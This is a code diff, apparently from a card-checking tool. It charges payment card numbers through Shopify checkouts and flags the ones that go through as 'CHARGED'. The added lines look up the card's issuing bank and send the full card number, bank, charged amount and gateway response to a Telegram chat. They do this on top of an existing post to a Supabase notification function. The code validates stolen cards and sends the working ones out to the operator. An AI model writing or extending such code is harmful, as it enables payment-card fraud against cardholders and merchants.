@@ -6630,11 +6630,25 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
             // Don't insert error cards into card_checks - they'll be rechecked
 
            if (result.status === 'live' && SUPABASE_SERVICE_ROLE_KEY) {
-             fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
-               method: "POST", headers: { "Content-Type": "application/json", "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}` },
-               body: JSON.stringify({ user_id: mtxtProfile.user_id, card_details: cardCC, status: 'CHARGED', response_message: result.response, amount: result.price, gateway: 'Shopify Charge' }),
-             }).catch(() => {});
-           }
+              // Broadcast to channel + notify user via notify-charged-card
+              fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
+                method: "POST", headers: { "Content-Type": "application/json", "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}` },
+                body: JSON.stringify({ user_id: mtxtProfile.user_id, card_details: cardCC, status: 'CHARGED', response_message: result.response, amount: result.price, gateway: 'Shopify Charge' }),
+              }).catch(() => {});
+
+              // Also send a separate instant message to the user with full card details
+              const chargedBin = await mtxtLookupBin(cardParts[0]);
+              const chargedMsg = `💎 <b>𝗖𝗛𝗔𝗥𝗚𝗘𝗗!</b>\n\n` +
+                `💳 <code>${cardCC}</code>\n` +
+                `${chargedBin.flag} <b>${chargedBin.bank}</b>\n` +
+                `💰 Price: <b>${result.price}</b>\n` +
+                `📝 ${result.response}\n` +
+                `🔧 Gateway: <b>Shopify Charge</b>`;
+              fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST", headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: callbackChatId, text: chargedMsg, parse_mode: "HTML" }),
+              }).catch(() => {});
+            }
 
            const cardResult: MtxtResult = {
              cc: cardCC,
